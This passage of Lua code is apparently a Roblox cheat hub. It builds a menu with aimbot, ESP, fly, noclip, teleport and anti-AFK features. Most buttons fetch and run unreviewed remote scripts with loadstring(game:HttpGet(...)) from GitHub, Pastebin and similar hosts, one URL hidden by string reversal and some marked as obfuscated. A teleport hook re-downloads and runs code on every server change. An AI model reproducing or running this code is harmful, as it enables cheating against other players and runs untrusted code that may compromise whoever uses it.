        Fill:GetPropertyChangedSignal("Size"):Connect(function()
            TextNumbers.Text = tostring(math.round(DeleteMob.Aimbot.Fov*100))
        end)
        
        local SliderActive = false
        
        local function ActivateSlider()
            SliderActive = true
            while SliderActive do
                UpdateSlider()
                task.wait()
            end
        end
        
        Trigger.MouseButton1Down:Connect(ActivateSlider)
        
        game:GetService("UserInputService").InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                SliderActive = false
            end
        end)
    end
    coroutine.wrap(LDTZWMY_fake_script)()
    
    local function YEOE_fake_script() -- Slider4.Script2 
        local Mouse = game.Players.LocalPlayer:GetMouse()
        local Slider = Slider4
        local Fill = Fill2
        local Trigger = TriggerSmoothing
        local TextNumbers = Numbers_2
        
        local maxvalue = 3 or 30/30
        local startingvalue = 0 or 0/100
        
        Fill.Size = UDim2.fromScale(DeleteMob.Aimbot.Smoothing,1)
        TextNumbers.Text = tostring(math.round(DeleteMob.Aimbot.Smoothing*100))
        
        local TweenService = game:GetService("TweenService")
        local TweenStyle =  TweenInfo.new(0.25, Enum.EasingStyle.Exponential)
        
        local function UpdateSlider()
            local OutPut = math.clamp(((Vector2.new(Mouse.X,Mouse.Y)-Slider.AbsolutePosition)/Slider.AbsoluteSize).X,0,1)
            
            if DeleteMob.Aimbot.Smoothing ~= OutPut then
                TweenService:Create(Fill,TweenStyle,{Size = UDim2.fromScale(OutPut,1)}):Play()
            end
            
            DeleteMob.Aimbot.Smoothing = startingvalue +(OutPut*(maxvalue-startingvalue))
            TextNumbers.Text = tostring(math.round(DeleteMob.Aimbot.Smoothing*100))
        end
        
        Fill:GetPropertyChangedSignal("Size"):Connect(function()
            TextNumbers.Text = tostring(math.round(DeleteMob.Aimbot.Smoothing*100))
        end)
        
        local SliderActive = false
        
        local function ActivateSlider()
            SliderActive = true
            while SliderActive do
                UpdateSlider()
                task.wait()
            end
        end
        
        Trigger.MouseButton1Down:Connect(ActivateSlider)
        
        game:GetService("UserInputService").InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                SliderActive = false
            end
        end)
        
    end
    coroutine.wrap(YEOE_fake_script)()
    local function GOUU_fake_script() -- Slider1.Script3 
        local Mouse = game.Players.LocalPlayer:GetMouse()
        local Slider = Slider1
        local Fill = Fill3
        local Trigger = TriggerOutTans
        local TextNumbers = Numbers_3
        
        local maxvalue = 1 or 100/100
        local startingvalue = 0 or 0/100
        
        Fill.Size = UDim2.fromScale(DeleteMob.ESP.OutLines.OutlineTrancparency,1)
        TextNumbers.Text = tostring(math.round(DeleteMob.ESP.OutLines.OutlineTrancparency*100))
        
        local TweenService = game:GetService("TweenService")
        local TweenStyle =  TweenInfo.new(0.25, Enum.EasingStyle.Exponential)
        
        local function UpdateSlider()
            local OutPut = math.clamp(((Vector2.new(Mouse.X,Mouse.Y)-Slider.AbsolutePosition)/Slider.AbsoluteSize).X,0,1)
            
            if DeleteMob.ESP.OutLines.OutlineTrancparency ~= OutPut then
                TweenService:Create(Fill,TweenStyle,{Size = UDim2.fromScale(OutPut,1)}):Play()
            end
            
            DeleteMob.ESP.OutLines.OutlineTrancparency = startingvalue +(OutPut*(maxvalue-startingvalue))
            TextNumbers.Text = tostring(math.round(DeleteMob.ESP.OutLines.OutlineTrancparency*100))
        end
        
        Fill:GetPropertyChangedSignal("Size"):Connect(function()
            TextNumbers.Text = tostring(math.round(DeleteMob.ESP.OutLines.OutlineTrancparency*100))
        end)
        
        local SliderActive = false
        
        local function ActivateSlider()
            SliderActive = true
            while SliderActive do
                UpdateSlider()
                task.wait()
            end
        end
        
        Trigger.MouseButton1Down:Connect(ActivateSlider)
        
        game:GetService("UserInputService").InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                SliderActive = false
            end
        end)
        
    end
    coroutine.wrap(GOUU_fake_script)()
    local function MMUKLB_fake_script() -- Slider2.Script4 
        local Mouse = game.Players.LocalPlayer:GetMouse()
        local Slider = Slider2
        local Fill = Fill4
        local Trigger = TriggerFill
        local TextNumbers = Numbers_4
        
        local maxvalue = 1 or 100/100
        local startingvalue = 0 or 0/100
        
        Fill.Size = UDim2.fromScale(DeleteMob.ESP.OutLines.FillTrancparenct,1)
        TextNumbers.Text = tostring(math.round(DeleteMob.ESP.OutLines.FillTrancparenct*100))
        
        local TweenService = game:GetService("TweenService")
        local TweenStyle =  TweenInfo.new(0.25, Enum.EasingStyle.Exponential)
        
        local function UpdateSlider()
            local OutPut = math.clamp(((Vector2.new(Mouse.X,Mouse.Y)-Slider.AbsolutePosition)/Slider.AbsoluteSize).X,0,1)
            
            if DeleteMob.ESP.OutLines.FillTrancparenct ~= OutPut then
                TweenService:Create(Fill,TweenStyle,{Size = UDim2.fromScale(OutPut,1)}):Play()
            end
            
            DeleteMob.ESP.OutLines.FillTrancparenct = startingvalue +(OutPut*(maxvalue-startingvalue))
            TextNumbers.Text = tostring(math.round(DeleteMob.ESP.OutLines.FillTrancparenct*100))
        end
        
        Fill:GetPropertyChangedSignal("Size"):Connect(function()
            TextNumbers.Text = tostring(math.round(DeleteMob.ESP.OutLines.FillTrancparenct*100))
        end)
        
        local SliderActive = false
        
        local function ActivateSlider()
            SliderActive = true
            while SliderActive do
                UpdateSlider()
                task.wait()
            end
        end
        
        Trigger.MouseButton1Down:Connect(ActivateSlider)
        
        game:GetService("UserInputService").InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                SliderActive = false
            end
        end)
        
    end
    coroutine.wrap(MMUKLB_fake_script)()
    
    
    game:GetService('RunService').RenderStepped:connect(function()
    
        -- Aimbot Check
        if DeleteMob.Aimbot.IsAimKeyDown then
            local _pos = CameraGetClosestToMouse(DeleteMob.Aimbot.Fov)
            if _pos then
                aimAt(_pos, DeleteMob.Aimbot.Smoothing)
            end
        end
    
        -- Fov
        local acc = DeleteMob.Aimbot.Smoothing / 2	
        local posd = UIS:GetMouseLocation() 
        FOVFFrame.Position = UDim2.new(0, posd.X, 0, posd.Y - 36)
        FOVFFrame.Size = UDim2.new(0, DeleteMob.Aimbot.Fov + acc, 0, DeleteMob.Aimbot.Fov + acc)
        FOVFFrame.Visible = DeleteMob.Aimbot.ShowFov
        FOVFFrame.BackgroundColor3 = DeleteMob.Aimbot.FovFillColor
        FOVFFrame.Transparency = DeleteMob.Aimbot.FovFillTransparency
    
        UIStroke.Color = DeleteMob.Aimbot.FovFillColor
        UIStroke.Transparency = DeleteMob.Aimbot.FovTransparenct
        UIStroke.Thickness = DeleteMob.Aimbot.Thickness
        
        -- Colors 
        
        DeleteMob.ESP.Box.BoxColor = Color3.fromRGB(tonumber(Box_R.Text), tonumber(Box_G.Text), tonumber(Box_B.Text))
        DeleteMob.ESP.OutLines.FillCollor = Color3.fromRGB(tonumber(FillOutlines_R.Text), tonumber(FillOutlines_G.Text), tonumber(FillOutlines_B.Text))
        DeleteMob.ESP.OutLines.OutlineColor = Color3.fromRGB(tonumber(Outlines_R.Text), tonumber(Outlines_G.Text), tonumber(Outlines_B.Text))
        DeleteMob.ESP.Tracers.Color = Color3.fromRGB(tonumber(Tracers_R.Text), tonumber(Tracers_G.Text), tonumber(Tracers_B.Text))
    end)
    
    
    task.wait()
    
    for i,plr in pairs(game.Players:GetChildren()) do
        AddHighlight(plr)
        AddBox(plr)
        AddTracers(plr)
    end
    
    game.Players.PlayerAdded:Connect(function(plr)
        AddHighlight(plr)
        AddBox(plr)
        AddTracers(plr)
    end)
        end)

Section:NewButton("Dex", "-", function()
wait()
loadstring(game:GetObjects('rbxassetid://2180084478')[1].Source)()
end)

local Tab = Window:NewTab("Scripts")
 
local Section = Tab:NewSection("Script HUB")
 
Section:NewButton("Infiniteyield", "-", function()
wait()
getgenv().readfile = nil
loadstring(game:HttpGet"https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")()
end)
 
Section:NewButton("Epic mini games", "-", function()
wait()
loadstring(game:HttpGet("https://pastebin.com/raw/YePwz5u5", true))()
end)
 
Section:NewButton("Arsenal", "-", function()
wait()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Insertl/QuotasHub/main/BETAv1.3"))()
end)
 
Section:NewButton("Hide And Seek Extreme", "Grab All Coins, Player Esp", function()
wait()
loadstring(game:HttpGet('https://gist.githubusercontent.com/RavyarTheBest/d0d5f9c3a8c2ca6749dda6d50fddaf00/raw/d05311914c0ab73506de76e91297743ad53097e2/gistfile1.txt'))()
end)

Section:NewButton("Area 51", "-", function()
wait()
loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/SurviveandKilltheKillersinArea51.lua"))()
end)

Section:NewButton("Blade Ball AI", "-", function()
    wait()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AFGCLIENT/BladeBall/main/Bladeball%20Obfuscated.lua"))()
    end)

Section:NewButton("Blade Ball AutoParry", "-", function()
wait()
--Red Circle Auto-Block:
getgenv().visualizer = true
loadstring(game:HttpGet("https://raw.githubusercontent.com/1f0yt/community/main/RedCircleBlock"))()
end)

Section:NewButton("Ragdoll Engine", "-", function()
wait()
loadstring(game:HttpGet(('https://gitlab.com/Tsuniox/lua-stuff/-/raw/master/RagdollEngineGUI.lua'),true))()
end)

Section:NewButton("Tower Of Hell [more] ----------->","Teleport To The Finish, God Mode & More", function()
wait()
loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Loader.lua"))()
end)

Section:NewButton("pet simulator x", "-", function()
wait()
local link, response = pcall(game.HttpGet, game, string.reverse'aul.niaM/ihcati/113vbuhretsam/lolytsed/moc.tnetnocresubuhtig.war//:sptth', true)
if not link then return error("Failed to access raw") end
local loads, err = coroutine.create(loadstring(response, '@desty#1821', '@GramxPersons#1111'))
if not loads then return error('Failed to load response') end
coroutine.resume(loads)
end)

Section:NewButton("MM2", "-", function()
wait()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/TheLariska/mm2/main/mm2'), true))()
end)

Section:NewButton("slap battles", "-", function()
wait()
loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/sbbe", true))()
end)

Section:NewButton("Hotel (Teleport)", "-", function()
wait()
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Robojini/Tuturial_UI_Library/main/UI_Template_1"))()
 
local Window = Library.CreateLib("Hotel Script (M)", "RJTheme1")
 
local Tab = Window:NewTab("Teleport")
 
local Section = Tab:NewSection("Teleport to location")

Section:NewButton("Teleport to lobby", "-", function()
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-17.0841465, 3.12035966, -5.50693083, -0.999969721, 1.79440693e-08, 0.00778075261, 1.77179622e-08, 1, -2.91285751e-08, -0.00778075261, -2.89898345e-08, -0.999969721)
end)

Section:NewButton("Teleport to Lobby doors","-", function()
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-19.1821957, 3.09999919, -31.4253216, -0.999962687, -5.73006353e-08, -0.00863679312, -5.72885952e-08, 1, -1.6414804e-09, 0.00863679312, -1.14662946e-09, -0.999962687)
end)

Section:NewButton("Teleport to Roof","-",function()
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-35.0348892, 118.701996, 28.1529846, 0.0646820217, -6.33888746e-08, 0.99790591, 4.03932034e-08, 1, 6.09037016e-08, -0.99790591, 3.63692401e-08, 0.0646820217)
end)

Section:NewButton("Teleport to Secret End", "-", function()
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(33.8493843, 129.404953, 5.43408394, -0.051406309, -7.40296073e-08, -0.99867785, 5.32146558e-08, 1, -7.68668116e-08, 0.99867785, -5.70957361e-08, -0.051406309)
end)

Section:NewButton("Teleport to the elevator on the 1st floor", "-", function()
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(19.0589886, 3.30001235, 5.64972115, -0.0164933354, -6.86159467e-08, 0.999863982, 1.10235607e-08, 1, 6.88071182e-08, -0.999863982, 1.21569208e-08, -0.0164933354)
end)

Section:NewButton("Fly", "You can fly (PRESS TO E)", function()
wait()
repeat wait() 
    until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid") 
local mouse = game.Players.LocalPlayer:GetMouse() 
repeat wait() until mouse
local plr = game.Players.LocalPlayer 
local torso = plr.Character.Torso 
local flying = true
local deb = true 
local ctrl = {f = 0, b = 0, l = 0, r = 0} 
local lastctrl = {f = 0, b = 0, l = 0, r = 0} 
local maxspeed = 50 
local speed = 0 
 
function Fly() 
local bg = Instance.new("BodyGyro", torso) 
bg.P = 9e4 
bg.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
bg.cframe = torso.CFrame 
local bv = Instance.new("BodyVelocity", torso) 
bv.velocity = Vector3.new(0,0.1,0) 
bv.maxForce = Vector3.new(9e9, 9e9, 9e9) 
repeat wait() 
plr.Character.Humanoid.PlatformStand = true 
if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then 
speed = speed+.5+(speed/maxspeed) 
if speed > maxspeed then 
speed = maxspeed 
end 
elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then 
speed = speed-1 
if speed < 0 then 
speed = 0 
end 
end 
if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then 
bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r} 
elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then 
bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
else 
bv.velocity = Vector3.new(0,0.1,0) 
end 
bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0) 
until not flying 
ctrl = {f = 0, b = 0, l = 0, r = 0} 
lastctrl = {f = 0, b = 0, l = 0, r = 0} 
speed = 0 
bg:Destroy() 
bv:Destroy() 
plr.Character.Humanoid.PlatformStand = false 
end 
mouse.KeyDown:connect(function(key) 
if key:lower() == "e" then 
if flying then flying = false 
else 
flying = true 
Fly() 
end 
elseif key:lower() == "w" then 
ctrl.f = 1 
elseif key:lower() == "s" then 
ctrl.b = -1 
elseif key:lower() == "a" then 
ctrl.l = -1 
elseif key:lower() == "d" then 
ctrl.r = 1 
end 
end) 
mouse.KeyUp:connect(function(key) 
if key:lower() == "w" then 
ctrl.f = 0 
elseif key:lower() == "s" then 
ctrl.b = 0 
elseif key:lower() == "a" then 
ctrl.l = 0 
elseif key:lower() == "d" then 
ctrl.r = 0 
end 
end)
Fly()
end)

Section:NewButton("Noclip (M)", "-", function()
wait()
local Workspace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local Noclip = Instance.new("ScreenGui")
local BG = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Toggle = Instance.new("TextButton")
local StatusPF = Instance.new("TextLabel")
local Status = Instance.new("TextLabel")
local Credit = Instance.new("TextLabel")
local Plr = Players.LocalPlayer
local Clipon = false
 
Noclip.Name = "Noclip"
Noclip.Parent = game.CoreGui
 
BG.Name = "BG"
BG.Parent = Noclip
BG.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
BG.BorderColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
BG.BorderSizePixel = 2
BG.Position = UDim2.new(0.149479166, 0, 0.82087779, 0)
BG.Size = UDim2.new(0, 210, 0, 127)
BG.Active = true
BG.Draggable = true
 
Title.Name = "Title"
Title.Parent = BG
Title.BackgroundColor3 = Color3.new(0.266667, 0.00392157, 0.627451)
Title.BorderColor3 = Color3.new(0.180392, 0, 0.431373)
Title.BorderSizePixel = 2
Title.Size = UDim2.new(0, 210, 0, 33)
Title.Font = Enum.Font.Highway
Title.Text = "Noclip"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.FontSize = Enum.FontSize.Size32
Title.TextSize = 30
Title.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
Title.TextStrokeTransparency = 0
 
Toggle.Parent = BG
Toggle.BackgroundColor3 = Color3.new(0.266667, 0.00392157, 0.627451)
Toggle.BorderColor3 = Color3.new(0.180392, 0, 0.431373)
Toggle.BorderSizePixel = 2
Toggle.Position = UDim2.new(0.152380958, 0, 0.374192119, 0)
Toggle.Size = UDim2.new(0, 146, 0, 36)
Toggle.Font = Enum.Font.Highway
Toggle.FontSize = Enum.FontSize.Size28
Toggle.Text = "Toggle"
Toggle.TextColor3 = Color3.new(1, 1, 1)
Toggle.TextSize = 25
Toggle.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
Toggle.TextStrokeTransparency = 0
 
StatusPF.Name = "StatusPF"
StatusPF.Parent = BG
StatusPF.BackgroundColor3 = Color3.new(1, 1, 1)
StatusPF.BackgroundTransparency = 1
StatusPF.Position = UDim2.new(0.314285725, 0, 0.708661377, 0)
StatusPF.Size = UDim2.new(0, 56, 0, 20)
StatusPF.Font = Enum.Font.Highway
StatusPF.FontSize = Enum.FontSize.Size24
StatusPF.Text = "Status:"
StatusPF.TextColor3 = Color3.new(1, 1, 1)
StatusPF.TextSize = 20
StatusPF.TextStrokeColor3 = Color3.new(0.333333, 0.333333, 0.333333)
StatusPF.TextStrokeTransparency = 0
StatusPF.TextWrapped = true
 
Status.Name = "Status"
Status.Parent = BG
Status.BackgroundColor3 = Color3.new(1, 1, 1)
Status.BackgroundTransparency = 1
Status.Position = UDim2.new(0.580952346, 0, 0.708661377, 0)
Status.Size = UDim2.new(0, 56, 0, 20)
Status.Font = Enum.Font.Highway
Status.FontSize = Enum.FontSize.Size14
Status.Text = "off"
Status.TextColor3 = Color3.new(0.666667, 0, 0)
Status.TextScaled = true
Status.TextSize = 14
Status.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
Status.TextWrapped = true
Status.TextXAlignment = Enum.TextXAlignment.Left
 
Credit.Name = "Credit"
Credit.Parent = BG
Credit.BackgroundColor3 = Color3.new(1, 1, 1)
Credit.BackgroundTransparency = 1
Credit.Position = UDim2.new(0.195238099, 0, 0.866141737, 0)
Credit.Size = UDim2.new(0, 128, 0, 17)
Credit.Font = Enum.Font.SourceSans
Credit.FontSize = Enum.FontSize.Size18
Credit.Text = "Created by Meetly"
Credit.TextColor3 = Color3.new(1, 1, 1)
Credit.TextSize = 16
Credit.TextStrokeColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Credit.TextStrokeTransparency = 0
Credit.TextWrapped = true
 
Toggle.MouseButton1Click:connect(function()
    if Status.Text == "off" then
        Clipon = true
        Status.Text = "on"
        Status.TextColor3 = Color3.new(0,185,0)
        Stepped = game:GetService("RunService").Stepped:Connect(function()
            if not Clipon == false then
                for a, b in pairs(Workspace:GetChildren()) do
                if b.Name == Plr.Name then
                for i, v in pairs(Workspace[Plr.Name]:GetChildren()) do
                if v:IsA("BasePart") then
                v.CanCollide = false
                end end end end
            else
                Stepped:Disconnect()
            end
        end)
    elseif Status.Text == "on" then
        Clipon = false
        Status.Text = "off"
        Status.TextColor3 = Color3.new(170,0,0)
    end
end)
end)

Section:NewButton("Universal ESP", "ESP", function()
wait()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP'))()
end)

local Tab = Window:NewTab("Room")

local Section = Tab:NewSection("Teleport to Room")

Section:NewButton("Teleport to 201 Room","-", function()
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(12.658576, 28.3099861, 39.1859894, 0.99999404, -3.31578001e-08, -0.00344511145, 3.327375e-08, 1, 3.359904e-08, 0.00344511145, -3.37134729e-08, 0.99999404)
end)

Section:NewButton("Teleport to 202 Room","-", function()
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1.83784711, 28.3099861, 89.3056183, -0.00577315688, 2.52650967e-08, -0.999983311, -1.05413449e-07, 1, 2.58740958e-08, 0.999983311, 1.05561064e-07, -0.00577315688)
end)

Section:NewButton("Teleport to 203 Room","-", function()
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(28.5301018, 28.3099861, 88.3382263, 0.00510061625, -5.24217043e-08, -0.999987006, 4.57833096e-08, 1, -5.21888595e-08, 0.999987006, -4.55165186e-08, 0.00510061625)
end)

Section:NewButton("Teleport to 301 Room","-", function()
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9.47460175, 53.3079834, 44.2039146, -0.0579495691, 1.1918106e-07, -0.998319507, 2.60743138e-09, 1, 1.19230322e-07, 0.998319507, 4.30629621e-09, -0.0579495691)
end)

Section:NewButton("Teleport to 302 Room","-", function()
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1.43064654, 53.3099823, 67.2761688, -0.991115928, -4.65706975e-08, 0.133000672, -3.80460357e-08, 1, 6.66362467e-08, -0.133000672, 6.09840995e-08, -0.991115928)
end)

Section:NewButton("Teleport to 303 Room","-", function()
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(24.182148, 53.3079834, 66.7197723, -0.99993819, -4.58717536e-10, -0.011117843, -1.51710322e-09, 1, 9.51885966e-08, 0.011117843, 9.51995816e-08, -0.99993819 )
end)

Section:NewButton("Teleport to 401 Room","-", function()
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(12.7367868, 78.309967, 39.2877312, 0.999722064, -5.61522242e-08, -0.0235757791, 5.56044952e-08, 1, -2.38882158e-08, 0.0235757791, 2.25706565e-08, 0.999722064)
end)

Section:NewButton("Teleport to 402 Room","-", function()
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2.83879352, 78.309967, 89.4008713, 0.0127693806, 3.16451754e-08, -0.999918461, 7.16524085e-08, 1, 3.2562788e-08, 0.999918461, -7.20623703e-08, 0.0127693806)
end)

Section:NewButton("Teleport to 403 Room","-", function()
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(28.5971813, 78.309967, 89.1277161, -0.0294504017, 2.99247951e-08, -0.999566257, 3.24352598e-08, 1, 2.8982134e-08, 0.999566257, -3.15676552e-08, -0.0294504017)
end)

local Setting = Window:NewTab("Setting")
local SettingSection = Setting:NewSection("Setting")

SettingSection:NewKeybind("Toggle UI", "Close/Open UI", Enum.KeyCode.BackSlash, function()
    Library:ToggleUI()
end)

Section:NewButton("FPS BOOSTER", "Boost FPS", function()
-- Made by RIP#6666
_G.Settings = {
    Players = {
        ["Ignore Me"] = true, -- Ignore your Character
        ["Ignore Others"] = true -- Ignore other Characters
    },
    Meshes = {
        Destroy = false, -- Destroy Meshes
        LowDetail = true -- Low detail meshes (NOT SURE IT DOES ANYTHING)
    },
    Images = {
        Invisible = true, -- Invisible Images
        LowDetail = false, -- Low detail images (NOT SURE IT DOES ANYTHING)
        Destroy = false, -- Destroy Images
    },
    Other = {
        ["No Particles"] = true, -- Disables all ParticleEmitter, Trail, Smoke, Fire and Sparkles
        ["No Camera Effects"] = true, -- Disables all PostEffect's (Camera/Lighting Effects)
        ["No Explosions"] = true, -- Makes Explosion's invisible
        ["No Clothes"] = true, -- Removes Clothing from the game
        ["Low Water Graphics"] = true, -- Removes Water Quality
        ["No Shadows"] = true, -- Remove Shadows
        ["Low Rendering"] = true, -- Lower Rendering
        ["Low Quality Parts"] = true -- Lower quality parts
    }
}
loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/FPSBooster.lua"))()
end)

UniversalSection:NewButton("Auto Grammar", "Idk Why U Need This But Its Cool IG?", function()
    shared.CustomCorrections = {
        ["examplething12"] = "hello" -- if you say "examplething12" it will become hello
    }
    loadstring(game:HttpGet("https://raw.githubusercontent.com/eosuwu/boblox/main/autogremer.lua"))()
end)

UniversalSection:NewButton("Universal Hub", "One Of The Best UIS I Have ever Seen", function()
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/richie0866/orca/master/public/snapshot.lua"))()
end)


local Credits = Window:NewTab("Credits")
local CreditsSection = Credits:NewSection("Credits")

CreditsSection:NewTextBox("Not_zentical#4847", "No One Else Except the script owners", function(txt)
    print(txt)
end)
 
local Tab = Window:NewTab("Creators")
 
local Section = Tab:NewSection("Developer: TheMeetly#0885")

local Section = Tab:NewSection("Beta tester: TheMeetly#0885")

local Section = Tab:NewSection("ideas: TheMeetly#0885")
end)

Section:NewButton("Bed Wars (vape 4)", "-", function()
wait()
--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
-- credits to 7GrandDadPGN for vape v4.
loadstring(game:HttpGet("https://raw.githubusercontent.com/MuhXd/Roblox-mobile-script/main/FileFixes.lua"))();
loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()

task.spawn(function()
    local teleportConnection = game.Players.LocalPlayer.OnTeleport:Connect(function(State)
        if (not teleportedServers) then
    local queueonteleport = syn and syn.queue_on_teleport or queue_on_teleport or function() end
        queueonteleport([[
            if not game:IsLoaded() then
                game.Loaded:Wait()
            end
            loadstring(game:HttpGet("https://raw.githubusercontent.com/MuhXd/Roblox-mobile-script/main/FileFixes.lua"))();
            loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
        ]])
    end
end)
end)
end)

Section:NewButton("War Tycoon", "-", function()
wait()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Vortex194/main/main/oilwarfare", true))()
end)

Section:NewButton("Piggy (tp to item)", "-", function()
wait()
local PiggyGui = Instance.new("ScreenGui")
PiggyGui.Name = "PiggyGui"
PiggyGui.Parent = game.StarterGui

local ScrollingFrame = Instance.new("ScrollingFrame", PiggyGui)
ScrollingFrame.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
ScrollingFrame.Position = UDim2.new(0.08, 0, 0.42, 0)
ScrollingFrame.Size = UDim2.new(0, 296, 0, 388)




local PiggyGui = Instance.new("ScreenGui")
PiggyGui.Name = "PiggyGui"
PiggyGui.Parent = game.CoreGui

local ScrollingFrame = Instance.new("ScrollingFrame", PiggyGui)
ScrollingFrame.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
ScrollingFrame.Position = UDim2.new(0.08, 0, 0.42, 0)
ScrollingFrame.Size = UDim2.new(0, 296, 0, 388)

local UIGridLayout = Instance.new("UIGridLayout", ScrollingFrame)
UIGridLayout.CellSize = UDim2.new(0,90,0,90)

while wait(1) do
local a = workspace:getDescendants()
local items = {}
local itemframes = ScrollingFrame:getChildren()
for i=1,#itemframes do
if itemframes[i].ClassName == "TextButton" then
itemframes[i]:remove()
end
end
for i=1,#a do
if a[i].Name == "ItemPickupScript" and a[i].Parent:findFirstChild("ClickDetector") then
table.insert(items, a[i].Parent)
end
end
for i=1,#items do
local ItemFrame = Instance.new("TextButton", ScrollingFrame)
ItemFrame.Name = "ItemFrame"
ItemFrame.BackgroundColor3 = Color3.new(1, 1, 1)
ItemFrame.BackgroundTransparency = 0.95
ItemFrame.Size = UDim2.new(0, 100, 0, 100)
ItemFrame.Text = ""
local View = Instance.new("ViewportFrame", ItemFrame)
View.Name = "View"
View.Size = UDim2.new(1,0,1,0)
View.BackgroundTransparency = 1
View.BorderSizePixel = 0
local object = items[i]
local viewportclone = object:Clone()
viewportclone.Parent = View
local cam = Instance.new("Camera", viewportclone)
cam.CameraType = Enum.CameraType.Fixed
local objectPosition = object.Position
local cameraPosition = objectPosition + Vector3.new(0,3,0)
cam.CoordinateFrame = CFrame.new(cameraPosition, objectPosition)
View.CurrentCamera = cam

ItemFrame.MouseButton1Down:connect(function()
if items[i]:findFirstChild("ClickDetector") then
local cpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
wait(0.05)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = items[i].CFrame
wait(0.1)
fireclickdetector(items[i].ClickDetector)
wait(0.3)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = cpos
end
end)
end
end
end)

Section:NewButton("Lucky Blocks", "-", function()
wait()
--Best LuckyBlock script Join for more! https://discord.gg/v7PDxkhqWt
local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:connect(function()
    vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    wait(1)
    vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)
 
game.StarterGui:SetCore("SendNotification", {
    Title = "LUCKY BLOCKS Battlegrounds";
    Text = "Made by MaGiXx"; -- what the text says (ofc)
    Duration = 5;
})
wait(1)
game.StarterGui:SetCore("SendNotification", {
    Title = "Anti-Afk";
